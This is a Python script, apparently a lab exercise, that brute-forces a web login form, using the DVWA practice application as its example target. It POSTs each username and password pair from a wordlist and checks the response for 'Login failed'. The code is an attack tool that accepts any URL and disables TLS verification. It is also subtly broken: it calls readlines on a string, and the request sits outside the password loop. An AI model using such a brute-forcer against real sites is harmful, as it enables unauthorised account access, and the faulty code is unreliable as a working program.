from termcolor import cprint
import pyfiglet
import requests
from datetime import datetime
import sys


# Basic user interface header
banner = pyfiglet.figlet_format("RACCOON -> LCRACKER")
cprint(banner, 'blue')

# Asking the user for a URL anda username to use in the attack
url = input("What URL do you want to bruteforce? (ex.http://192.168.142.138/dvwa/login.php): ")
username = input("What username do you want to try? (ex admin): ")

# This is where we ask the user for a password file. The program will read it
# if the password is found, it will be printed in green
# if the password is not found, it will be printed as 'attempt failed' in red
try:
    password_file = input("Please enter the name of the password file: ")
    file = open(password_file, "r").read()
except FileNotFoundError:
    cprint("The file was not found...", 'red')

#The banner with information about when the cracking starts + the hash to be cracked
cprint("_" * 50, 'blue')
cprint("The URL is " + url, 'blue')
cprint("Cracking with username " + username, 'blue')
cprint("Cracking with this passwordfile: " + password_file, 'blue')
cprint("Cracking login page started at: " + str(datetime.now()), 'blue')
cprint("_" * 50, 'blue')



# Now the program will try all passwords in the password file
try:
    for password in file.readlines():
        password = password.strip("\n")

    # The program is using the input fields to try the username and password submitted by the user
    data = {'username':username, 'password':password, "Login":'submit'}
    send_data_url = requests.post(url, data=data, verify=False)
    
    # From here the program prints the status code, the url and the html of index.php
    # An indication of successful login is if the html code shows h1; Welcome to DVWA
    cprint("HTTP status code: ", 'green')
    print(send_data_url.status_code)
    cprint("The URL: ", 'green')
    print(send_data_url.url)
    cprint("The HTML: ", 'green')
    print(send_data_url.content)
   
    # If the password is not correct, this code will run
    if "Login failed" in str(send_data_url.content):
        cprint("[*] Attempting password: %s" % password, 'red')
    else:
        # If the password is correct, this code will run, and print the password with green text
        cprint("[*] Password found: %s " % password,'green')
        
except TimeoutError:
    # If none of the code above (from try to the if / else), this code will run
    cprint("There was an error, please try again..", 'red')
    sys.exit()
except SystemError:
    cprint("There was a system error..", 'red')
    sys.exit()
except SyntaxError:
    cprint("That is not the correct syntax...", 'red')
    sys.exit()
except KeyboardInterrupt:
    cprint("The program was interrupted by the user...", 'red')
    sys.exit()